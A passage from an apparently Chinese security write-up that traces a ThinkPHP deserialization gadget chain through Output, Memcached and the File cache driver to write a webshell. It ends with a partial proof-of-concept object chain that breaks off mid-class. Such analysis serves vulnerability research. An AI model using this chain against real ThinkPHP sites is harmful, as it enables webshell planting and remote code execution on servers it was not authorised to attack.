<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;key&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;ls&quot;</span><span class="p">];</span><span class="w"> </span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">db</span><span class="p">{</span>
<span class="w">    </span><span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">console</span>\<span class="n">Output</span><span class="p">;</span>
<span class="w">    </span><span class="k">class</span><span class="w"> </span><span class="n">Query</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">model</span><span class="p">;</span>
<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">()</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Output</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">relation</span><span class="p">{</span>
<span class="w">    </span><span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">db</span>\<span class="n">Query</span><span class="p">;</span>
<span class="w">    </span><span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">Relation</span><span class="p">;</span>
<span class="w">    </span><span class="n">abstract</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">OneToOne</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">Relation</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">query</span><span class="p">;</span>
<span class="w">        </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">bindAttr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">()</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">class</span><span class="w"> </span><span class="n">HasOne</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">OneToOne</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">query</span><span class="p">;</span>
<span class="w">        </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">bindAttr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">()</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Query</span><span class="p">();</span>
<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">bindAttr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;1&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;1&quot;</span><span class="p">];</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>然后接着看Output，在<code>__call</code>中调用block</p>
<div class="codehilite"><pre><span></span><code>protected<span class="w"> </span>function<span class="w"> </span>block($style,<span class="w"> </span>$message)
{
<span class="w">    </span>$this-&gt;writeln(&quot;<span class="err">&lt;</span>{$style}&gt;{$message}<span class="err">&lt;</span>/$style&gt;&quot;);
}
</code></pre></div>

<p>继续writeln</p>
<div class="codehilite"><pre><span></span><code><span class="nx">public</span><span class="w"> </span><span class="nx">function</span><span class="w"> </span><span class="nx">writeln</span><span class="p">(</span><span class="err">$</span><span class="nx">messages</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="k">type</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="kp">self</span><span class="o">::</span><span class="nx">OUTPUT_NORMAL</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">write</span><span class="p">(</span><span class="err">$</span><span class="nx">messages</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="k">type</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>write</p>
<div class="codehilite"><pre><span></span><code><span class="nx">public</span><span class="w"> </span><span class="nx">function</span><span class="w"> </span><span class="nx">write</span><span class="p">(</span><span class="err">$</span><span class="nx">messages</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">newline</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="k">type</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="kp">self</span><span class="o">::</span><span class="nx">OUTPUT_NORMAL</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">handle</span><span class="o">-&gt;</span><span class="nx">write</span><span class="p">(</span><span class="err">$</span><span class="nx">messages</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">newline</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="k">type</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>而$this-&gt;handle是可控的，继续全局搜索write，寻找可控的点，找到了/thinkphp/library/think/session/driver/Memcached.php</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">write</span><span class="p">(</span><span class="err">$</span><span class="n">sessID</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">sessData</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">handler</span><span class="o">-&gt;</span><span class="nf">set</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">[</span><span class="s">&#39;session_name&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">$</span><span class="n">sessID</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">sessData</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">[</span><span class="s">&#39;expire&#39;</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div>

<p>这样就有找到了一个跳板set，然后继续找可以写入文件的方式，找到了/thinkphp/library/think/cache/driver/File.php</p>
<div class="codehilite"><pre><span></span><code><span class="kr">public</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">set</span><span class="p">(</span><span class="nx">$name</span><span class="p">,</span><span class="w"> </span><span class="nx">$value</span><span class="p">,</span><span class="w"> </span><span class="nx">$expire</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">is_null</span><span class="p">(</span><span class="nx">$expire</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">$expire</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$this</span><span class="o">-&gt;</span><span class="nx">options</span><span class="p">[</span><span class="s1">&#39;expire&#39;</span><span class="p">];</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">$expire</span><span class="w"> </span><span class="ow">instanceof</span><span class="w"> </span><span class="err">\</span><span class="nx">DateTime</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">$expire</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$expire</span><span class="o">-&gt;</span><span class="nx">getTimestamp</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">time</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nx">$filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$this</span><span class="o">-&gt;</span><span class="nx">getCacheKey</span><span class="p">(</span><span class="nx">$name</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">$this</span><span class="o">-&gt;</span><span class="nx">tag</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">is_file</span><span class="p">(</span><span class="nx">$filename</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">$first</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nx">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">serialize</span><span class="p">(</span><span class="nx">$value</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">$this</span><span class="o">-&gt;</span><span class="nx">options</span><span class="p">[</span><span class="s1">&#39;data_compress&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;gzcompress&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">//数据压缩</span>
<span class="w">            </span><span class="nx">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">gzcompress</span><span class="p">(</span><span class="nx">$data</span><span class="p">,</span><span class="w"> </span><span class="mf">3</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nx">$data</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="err">&quot;</span><span class="cp">&lt;?php</span><span class="nx">\n</span><span class="c1">//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">isset</span><span class="p">(</span><span class="nv">$first</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setTagItem</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
            <span class="nb">clearstatcache</span><span class="p">();</span>
            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div>

<p>此处$filename可控，跟进getCacheKey</p>
<div class="codehilite"><pre><span></span><code><span class="n">protected</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">getCacheKey</span><span class="p">(</span><span class="err">$</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">auto</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">false</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="err">$</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">md5</span><span class="p">(</span><span class="err">$</span><span class="n">name</span><span class="p">);</span>
<span class="w">    </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;cache_subdir&#39;</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// 使用子目录</span>
<span class="w">        </span><span class="err">$</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="err">$</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="n">DS</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="err">$</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;prefix&#39;</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">$</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;prefix&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="n">DS</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">$</span><span class="n">name</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="err">$</span><span class="n">filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s">&#39;path&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">$</span><span class="n">name</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="s">&#39;.php&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="err">$</span><span class="n">dir</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="n">dirname</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">);</span>

<span class="w">    </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">auto</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">is_dir</span><span class="p">(</span><span class="err">$</span><span class="n">dir</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">mkdir</span><span class="p">(</span><span class="err">$</span><span class="n">dir</span><span class="p">,</span><span class="w"> </span><span class="mo">0755</span><span class="p">,</span><span class="w"> </span><span class="kr">true</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">filename</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>回来继续看$data，从传入的$value获取，但是在之前writeln处已经传入了true，而且不可控，只能继续往下看，可以看到当成功写入文件时，会调用setTagItem方法，跟进</p>
<div class="codehilite"><pre><span></span><code><span class="k">protected</span><span class="w"> </span><span class="nx">function</span><span class="w"> </span><span class="nx">setTagItem</span><span class="p">(</span><span class="err">$</span><span class="nx">name</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">tag</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">$</span><span class="nx">key</span><span class="w">       </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">tag_</span><span class="err">&#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">tag</span><span class="p">);</span>
<span class="w">        </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">tag</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">null</span><span class="p">;</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">has</span><span class="p">(</span><span class="err">$</span><span class="nx">key</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="err">$</span><span class="nx">value</span><span class="w">   </span><span class="p">=</span><span class="w"> </span><span class="nx">explode</span><span class="p">(</span><span class="sc">&#39;,&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">get</span><span class="p">(</span><span class="err">$</span><span class="nx">key</span><span class="p">));</span>
<span class="w">            </span><span class="err">$</span><span class="nx">value</span><span class="p">[]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">name</span><span class="p">;</span>
<span class="w">            </span><span class="err">$</span><span class="nx">value</span><span class="w">   </span><span class="p">=</span><span class="w"> </span><span class="nx">implode</span><span class="p">(</span><span class="sc">&#39;,&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">array_unique</span><span class="p">(</span><span class="err">$</span><span class="nx">value</span><span class="p">));</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="err">$</span><span class="nx">value</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">name</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">set</span><span class="p">(</span><span class="err">$</span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>又调用了一次set，且此处两个参数都是可控的，所以可以在文件名处搞事情，通过编码然后将文件名写入shell中</p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">process</span>\<span class="n">pipes</span><span class="p">;</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">Pivot</span><span class="p">;</span>
<span class="k">class</span><span class="w"> </span><span class="n">Pipes</span><span class="p">{</span>

<span class="p">}</span>

<span class="k">class</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">Pipes</span><span class="p">{</span>
<span class="w">    </span><span class="n">private</span><span class="w"> </span><span class="o">$</span><span class="n">files</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">files</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">new</span><span class="w"> </span><span class="n">Pivot</span><span class="p">()];</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span><span class="p">;</span><span class="c1">#Relation</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">db</span>\<span class="n">Query</span><span class="p">;</span>
<span class="n">abstract</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">Relation</span><span class="p">{</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">selfRelation</span><span class="p">;</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">query</span><span class="p">;</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">selfRelation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Query</span><span class="p">();</span><span class="c1">#class Query</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">relation</span><span class="p">;</span><span class="c1">#OneToOne HasOne</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">Relation</span><span class="p">;</span>
<span class="n">abstract</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">OneToOne</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">Relation</span><span class="p">{</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="n">parent</span><span class="p">::</span><span class="n">__construct</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="p">}</span>
<span class="k">class</span><span class="w"> </span><span class="n">HasOne</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">OneToOne</span><span class="p">{</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">bindAttr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="n">parent</span><span class="p">::</span><span class="n">__construct</span><span class="p">();</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">bindAttr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;no&quot;</span><span class="p">,</span><span class="s2">&quot;123&quot;</span><span class="p">];</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">console</span><span class="p">;</span><span class="c1">#Output</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">session</span>\<span class="n">driver</span>\<span class="n">Memcached</span><span class="p">;</span>
<span class="k">class</span><span class="w"> </span><span class="n">Output</span><span class="p">{</span>
<span class="w">    </span><span class="n">private</span><span class="w"> </span><span class="o">$</span><span class="n">handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">;</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">styles</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Memcached</span><span class="p">();</span><span class="o">//</span><span class="err">目的调用其</span><span class="n">write</span><span class="p">()</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">styles</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;getAttr&#39;</span><span class="p">];</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span><span class="p">;</span><span class="c1">#Model</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">model</span>\<span class="n">relation</span>\<span class="n">HasOne</span><span class="p">;</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">console</span>\<span class="n">Output</span><span class="p">;</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">db</span>\<span class="n">Query</span><span class="p">;</span>
<span class="n">abstract</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">Model</span><span class="p">{</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">append</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">error</span><span class="p">;</span>
<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="o">$</span><span class="n">parent</span><span class="p">;</span><span class="c1">#修改处</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">selfRelation</span><span class="p">;</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">query</span><span class="p">;</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">aaaaa</span><span class="p">;</span>

<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">parent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Output</span><span class="p">();</span><span class="c1">#Output对象,目的是调用__call()</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">append</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;getError&#39;</span><span class="p">];</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">HasOne</span><span class="p">();</span><span class="o">//</span><span class="n">Relation子类</span><span class="p">,</span><span class="err">且有</span><span class="n">getBindAttr</span><span class="p">()</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">selfRelation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span><span class="o">//</span><span class="n">isSelfRelation</span><span class="p">()</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Query</span><span class="p">();</span>

<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">db</span><span class="p">;</span><span class="c1">#Query</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">console</span>\<span class="n">Output</span><span class="p">;</span>
<span class="k">class</span><span class="w"> </span><span class="n">Query</span><span class="p">{</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">model</span><span class="p">;</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Output</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">session</span>\<span class="n">driver</span><span class="p">;</span><span class="c1">#Memcached</span>
<span class="n">use</span><span class="w"> </span><span class="n">think</span>\<span class="n">cache</span>\<span class="n">driver</span>\<span class="n">File</span><span class="p">;</span>
<span class="k">class</span><span class="w"> </span><span class="n">Memcached</span><span class="p">{</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">;</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
<span class="w">        </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">File</span><span class="p">();</span><span class="o">//</span><span class="err">目的调用</span><span class="n">File</span><span class="o">-&gt;</span><span class="n">set</span><span class="p">()</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
<span class="n">namespace</span><span class="w"> </span><span class="n">think</span>\<span class="n">cache</span>\<span class="n">driver</span><span class="p">;</span><span class="c1">#File</span>
<span class="k">class</span><span class="w"> </span><span class="n">File</span><span class="p">{</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="o">$</span><span class="n">tag</span><span class="p">;</span>
<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(){</span>
